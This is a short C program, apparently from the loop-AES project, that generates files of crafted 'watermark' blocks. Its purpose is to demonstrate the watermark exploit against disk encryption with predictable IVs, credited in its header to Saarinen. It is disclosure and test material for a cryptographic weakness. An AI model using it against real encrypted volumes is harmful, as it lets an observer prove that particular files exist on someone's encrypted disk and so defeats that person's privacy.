/*
 *  create-watermark-encodings.c
 *
 *  Written by Jari Ruusu, February 10 2004
 *
 *  Copyright 2004 by Jari Ruusu.
 *  Redistribution of this file is permitted under the GNU GPL
 *
 *  Usage:
 *  ./create-watermark-encodings encoding:count [encoding:count]... >filename
 *
 *  Where encoding is a value in range 1...32 and count is number of
 *  encodings to write. Watermark encoded file contents are written to
 *  standard output. Each encoding takes up 1024 bytes of disk space.
 *
 *  Example:
 *  ./create-watermark-encodings 5:123 19:17 23:2 >/home/foo/watermarks
 *
 *  Credits: Markku-Juhani O. Saarinen discovered this exploit.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

unsigned char buf[1024];
char *progName;

void encodeOne(int encoding)
{
    memset(buf, 0, sizeof(buf));
    buf[512] = 1;
    if(encoding < 1) encoding = 1;
    if(encoding < 32) {
        buf[512 + (encoding * 16)] = 1;
    }
}

void writeOne(void)
{
    if(fwrite(buf, 1024, 1, stdout) != 1) {
        perror("write failed");
        exit(1);
    }
}

int main(int argc, char **argv)
{
    int encoding, y = 0;
    unsigned long count, x;

    progName = *argv;
    if(argc < 2) {
        usage:
        fprintf(stderr, "usage: %s encoding:count [encoding:count]... >filename\n", progName);
        exit(1);
    }
    while(--argc > 0) {
        if(sscanf(*++argv, "%d:%lu", &encoding, &count) != 2) {
            goto usage;
        }
        for(x = 0; x < count; x++) {
            encodeOne(encoding);
            writeOne();
            y++;
        }
    }
    /* make file size multiple of 4K (to avoid fs tail packing) */
    while(y & 3) {
        memset(buf, 0, sizeof(buf));
        writeOne();
        y++;
    }
    if(fflush(stdout)) {
        perror("write failed");
        exit(1);
    }
    exit(0);
}
